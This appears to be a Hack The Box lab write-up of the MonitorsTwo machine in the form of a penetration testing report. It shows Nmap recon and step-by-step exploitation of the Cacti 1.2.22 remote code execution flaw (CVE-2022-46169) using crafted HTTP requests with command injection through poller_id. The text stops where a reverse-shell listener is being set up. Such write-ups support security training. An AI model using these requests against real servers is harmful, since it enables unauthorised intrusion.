# [HTB] MonitorsTwo - Penetration Testing Report
# Executive Summary
* **Target OS:** Linux
* **Difficulty:** Easy
* **Target IP:** 10.129.228.231
* **Vectors Used:** Cacti RCE (CVE-2022-46169) / Docker Privilege Escalation

# 1. Reconnaissance
Nmap was used for port scan against target
```bash
nmap -sV -sC 10.129.228.231
```
```bash
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-14 01:32 -0400
Nmap scan report for 10.129.228.231
Host is up (1.1s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 33.76 seconds
```
<br>

Result:
* **22/SSH (OpenSSH 8.2p1)**
* **80/HTTP(nginx 1.18.0)**
<br>

# 2. Web Enumeration
There was no hidden directory or subdomains existed on the [web page](./images/new.png) as a result of fuzzing. For more enumeration, hydra was also used for bruteforcing against web application, but no significant information was found. The web application was running by `Cacti 1.2.22`.

## BurpSuite
For further enumeration, `BurpSuite` was used against target how web application reacts when it is triggered. [Login request](.imgaes/) was intercepted.

# 3. Exploitation
## 1. CVE-2022-46169
`Cacti 1.2.22` was discovered that it is vulnerable against `Cacti RCE` (CVE-2022-46169). Several attempt of exploiting the vulnerability, accessing the internal system via RCE was successful.

<br>

1. Send the intercepted request to `repeater` and change the request method
```
REQUEST

GET /index.php?__csrf_magic=sid%3A4e720e8aae8196d8ee3bbea3dcff20ce810a322a%2C1792046253&action=login&login_username=username&login_password=password HTTP/1.1
Host: 10.129.228.231
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://10.129.228.231
Connection: keep-alive
Referer: http://10.129.228.231/index.php
Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a....
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
<br>

2. Switch `index.php` with `remote_agent.php`, which contains target parameter for exploitation. It is discovered that using `poller_id` parameter as cmd allowed Remote Code Execution to internal server by setting `local_data_ids[0]=6`.
```
REQUEST

GET /remote_agent.php?action=polldata&local_data_ids[0]=6&host_id=1&poller_id=`<bash>` HTTP/1.1
X-Forwarded-For: 127.0.0.1
Host: 10.129.228.231
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Origin: http://10.129.228.231
Connection: keep-alive
Referer: http://10.129.228.231/index.php
Cookie: CactiDateTime=Wed Oct 14 2026 02:28:57 GMT-0400 (Eastern Daylight Time); CactiTimeZone=-240; Cacti=a.....
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```
<br>

3. Check if the exploit works properly by sending the editted request. Following response indicates that the exploitation is working even if the attacker cannot directly see output.
```
RESPONSE

HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 15 Oct 2026 06:58:02 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/7.4.33
Last-Modified: Thu, 15 Oct 2026 06:58:02 GMT
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: default-src *; img-src 'self'  data: blob:; style-src 'self' 'unsafe-inline' ; script-src 'self'  'unsafe-inline' ; frame-ancestors 'self'; worker-src 'self' ;
P3P: CP="CAO PSA OUR"
Cache-Control: no-store, no-cache, must-revalidate
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Content-Length: 55

[{"value":"0","rrd_name":"uptime","local_data_id":"6"}]
```
<br>

4. start python listener on port 8000 and nc listener on any available port for reverse shell. 

























